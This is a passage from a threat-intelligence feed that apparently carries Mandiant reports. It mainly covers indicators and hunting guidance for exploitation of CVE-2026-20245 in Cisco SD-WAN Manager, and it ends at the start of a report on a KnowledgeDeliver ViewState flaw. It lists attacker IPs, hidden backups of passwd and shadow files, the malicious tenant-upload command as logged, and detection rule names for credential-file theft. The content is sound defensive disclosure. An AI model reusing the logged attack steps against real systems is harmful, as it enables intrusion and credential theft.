+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;&lt;table border="1px" cellpadding="16px" style="border-collapse: collapse; width: 100%;"&gt;&lt;colgroup&gt;&lt;col/&gt;&lt;col/&gt;&lt;/colgroup&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p style="text-align: center;"&gt;&lt;strong style="vertical-align: baseline;"&gt;Description&lt;/strong&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p style="text-align: center;"&gt;&lt;strong style="vertical-align: baseline;"&gt;Indicator&lt;/strong&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;IP address connecting as rogue device and exploiting CVE-2026-20245&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;126.51.108[.]152&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;IP address connecting as rogue device&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;76.92.245[.]217&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;IP address connecting as rogue device&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;207.190.37[.]94&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;IP address connecting as rogue device&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;23.245.7[.]178&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;IP address connecting as rogue device&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;153.186.231[.]233&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;IP address connecting as rogue device&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;167.179.79[.]189&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;IP address connecting as rogue device&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;45.32.38[.]160&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;IP address connecting as rogue device&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;209.137.225[.]101&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;h4&gt;&lt;span style="vertical-align: baseline;"&gt;File Indicators&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Due to the threat actor's extensive anti-forensic cleanup, several files associated with this intrusion were overwritten or deleted. However, forensic remnants of the malicious CSV payload were recovered.&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;div align="left"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;&lt;table&gt;&lt;colgroup&gt;&lt;col/&gt;&lt;col/&gt;&lt;col/&gt;&lt;/colgroup&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p style="text-align: center;"&gt;&lt;strong style="vertical-align: baseline;"&gt;Filename&lt;/strong&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p style="text-align: center;"&gt;&lt;strong style="vertical-align: baseline;"&gt;Description&lt;/strong&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p style="text-align: center;"&gt;&lt;strong style="vertical-align: baseline;"&gt;SHA256&lt;/strong&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;/home/admin/.orig_vbond_vsmart_tenant_list&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Backup configuration file&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Not recovered&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;/home/admin/.orig_vbond_vsmart_tenant_list.state&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;State file&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Not recovered&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;/home/admin/.orig_passwd&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Backup password file&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Not recovered&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;/home/admin/.orig_shadow&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Backup password file&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Not recovered&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;/home/admin/evil_tenant.csv&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Remnant of malicious CSV file exploiting CVE-2026-20245&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;b82936f37648518425c7d3cf9e09eaffa41d7cdb3840f6a40287e3a108880f7b&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Detections and Hunting&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Mandiant encourages organizations to conduct proactive threat hunts focused on the tactics, techniques, and procedures (TTPs) outlined in this report to identify activity that may otherwise blend into routine operations. Because certain indicators of compromises may mirror legitimate administrative actions, it is critical to assess these observations against the established network posture to minimize false positives.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;As per Cisco’s guidance, any suspicious activity or confirmed IOCs should be forwarded to the Cisco TAC for comprehensive review and assistance.&lt;/span&gt;&lt;/p&gt;
+&lt;h4&gt;&lt;span style="vertical-align: baseline;"&gt;Unauthorized SSH Connections as &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;vmanage-admin&lt;/code&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Monitor authentication logs (&lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;/var/log/auth.log&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;) for logins originating from unexpected external IP addresses using the vmanage-admin user account.&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;pre class="language-plain"&gt;&lt;code&gt;Jan 01 07:58:00 vManage sshd[20766]: Accepted publickey for vmanage-admin from &amp;lt;Threat Actor IP&amp;gt; port 48373 ssh2: RSA SHA256:&amp;lt;redacted&amp;gt;
+Jan 01 08:01:00 vManage sshd[25178]: Accepted keyboard-interactive/pam for admin from &amp;lt;Threat Actor IP&amp;gt; port 60552 ssh2&lt;/code&gt;&lt;/pre&gt;
+&lt;p style="text-align: center;"&gt;&lt;span style="color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;"&gt;&lt;span style="vertical-align: baseline;"&gt;Figure 5: SSH from unexpected origins&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;h4 style="text-align: justify;"&gt;&lt;span style="vertical-align: baseline;"&gt;Suspicious Password Change Events&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Audit password changes in &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;/var/log/auth.log&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; targeting the admin account in quick succession, particularly where credentials are set and subsequently reverted.&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;pre class="language-plain"&gt;&lt;code&gt;Jan 01 08:00:00 vManage usermod[12345]: change user 'admin' password
+Jan 01 08:15:00 vManage usermod[12345]: change user 'admin' password&lt;/code&gt;&lt;/pre&gt;
+&lt;p style="text-align: center;"&gt;&lt;span style="color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;"&gt;&lt;span style="vertical-align: baseline;"&gt;Figure 6: Password changes&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Defenders should also inspect rollback files present within &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;/var/confd/rollback/&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; for configuration delta commits targeting user passwords:&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;pre class="language-plain"&gt;&lt;code&gt;# Created by: vmanage-admin
+# Date: 2026-01-01 08:00:00
+# Via: netconf
+# Type: delta
+# Label: 
+# Comment: 
+# No: 10000
+# TransactionId: 12345678
+# Hostname: vManage
+
+system {
+    aaa {
+        user admin {
+password &amp;lt;redacted&amp;gt;;
+        }
+     }
+ }&lt;/code&gt;&lt;/pre&gt;
+&lt;p style="text-align: center;"&gt;&lt;span style="color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;"&gt;&lt;span style="vertical-align: baseline;"&gt;Figure 7: Rollback files&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;h4 style="text-align: justify;"&gt;&lt;span style="vertical-align: baseline;"&gt;Suspicious Execution of the &lt;code&gt;su&lt;/code&gt; Command&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Audit terminal command history and system logs (&lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;/var/log/auth.log&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;) for successful switch user (&lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;su&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;) executions from the admin account to unauthorized accounts (e.g., &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;troot&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;).&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;pre class="language-plain"&gt;&lt;code&gt;Jan 01 08:03:00 vManage su[24289]: Successful su for troot by admin&lt;/code&gt;&lt;/pre&gt;
+&lt;p style="text-align: center;"&gt;&lt;span style="color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;"&gt;&lt;span style="vertical-align: baseline;"&gt;Figure 8: &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;su&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; logins&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;h4 style="text-align: justify;"&gt;&lt;span style="vertical-align: baseline;"&gt;Exploitation of CVE-2026-20245&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Monitor script logs (&lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;/var/log/scripts.log&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;) for execution anomalies involving unauthorized execution of &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;vconfd_script_upload_tenant_list.sh&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;.&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;pre class="language-plain"&gt;&lt;code&gt;Jan 01 08:01:05 vManage vScript: Tenant list upload per vsmart serial number: /usr/bin/vconfd_script_upload_tenant_list.sh -cli path /home/admin/evil_tenant.csv vpn 0
+Jan 01 08:01:05 vManage vScript: uploading tenant list via VPN 0 true
+Jan 01 08:01:05 vManage vScript: Copying ... /home/admin/evil_tenant.csv via VPN 0
+Jan 01 08:01:05 vManage vScript: Successfully loaded the tenant placement file&lt;/code&gt;&lt;/pre&gt;
+&lt;p style="text-align: center;"&gt;&lt;span style="color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;"&gt;&lt;span style="vertical-align: baseline;"&gt;Figure 9: Execution anomalies&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Defenders can also query active command execution history using show history within the Viptela CLI for the specific administrative upload commands:&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;pre class="language-plain"&gt;&lt;code&gt;01-01 08:01:05 -- request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0&lt;/code&gt;&lt;/pre&gt;
+&lt;p style="text-align: center;"&gt;&lt;span style="color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;"&gt;&lt;span style="vertical-align: baseline;"&gt;Figure 10: Command execution&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Google Security Operations (SecOps)&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Google SecOps customers have access to these broad category rules and more under the Mandiant Intel Emerging Threats rule pack. The activity discussed in the blog post is detected in Google SecOps under the rule names:&lt;/span&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;span style="vertical-align: baseline;"&gt;Privileged Account Append to Passwd Database&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;span style="vertical-align: baseline;"&gt;Grep Privileged User Account Discovery in Passwd or Shadow&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;span style="vertical-align: baseline;"&gt;Hidden Backup of Sensitive System Files&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;span style="vertical-align: baseline;"&gt;Suspicious Copy from Usr Share to User Hidden Directory&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Acknowledgements&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Mandiant would like to thank the Cisco Product Security Incident Response Team (PSIRT) for their collaboration and partnership throughout the coordinated disclosure process.&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;</description><pubDate>Wed, 24 Jun 2026 11:00:00 +0000</pubDate><guid>https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager/</guid><category>Threat Intelligence</category><og xmlns:og="http://ogp.me/ns#"><type>article</type><title>Zero-Day Exploitation of Vulnerability (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager</title><description></description><site_name>Google</site_name><url>https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager/</url></og><author xmlns:author="http://www.w3.org/2005/Atom"><name>Mandiant </name><title></title><department></department><company></company></author></item><item><title>Exploitation of KnowledgeDeliver via ViewState Deserialization Vulnerability</title><link>https://cloud.google.com/blog/topics/threat-intelligence/knowledgedeliver-viewstate-deserialization-vulnerability/</link><description>&lt;div class="block-paragraph_advanced"&gt;&lt;p&gt;Written by: Takahiro Sugiyama, Peter Revelant, Mathew Potaczek&lt;/p&gt;
+&lt;hr/&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Introduction&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;In late 2025, Mandiant responded to a security incident involving a compromised web server running &lt;/span&gt;&lt;a href="https://www.digital-knowledge.co.jp/product/kd/" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;KnowledgeDeliver&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;. KnowledgeDeliver is a Learning Management System (LMS) developed by Digital Knowledge commonly used in Japan. Mandiant &lt;/span&gt;&lt;a href="https://github.com/mandiant/Vulnerability-Disclosures/blob/master/2026/MNDT-2026-0009.md" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;identified a critical vulnerability&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; that allowed unauthenticated Remote Code Execution (RCE). An unknown threat actor leveraged this access to inject malicious code into the LMS platform, with the goal of infecting users visiting the site.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;This vulnerability stems from the use of identical pre-shared ASP.NET machine keys across multiple customer deployments. The vulnerability was initially exploited as a zero-day, now tracked as &lt;/span&gt;&lt;a href="https://www.cve.org/CVERecord?id=CVE-2026-5426" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;CVE-2026-5426&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;.&lt;/span&gt;&lt;/p&gt;
+&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;The Vulnerability&lt;/span&gt;&lt;/h3&gt;
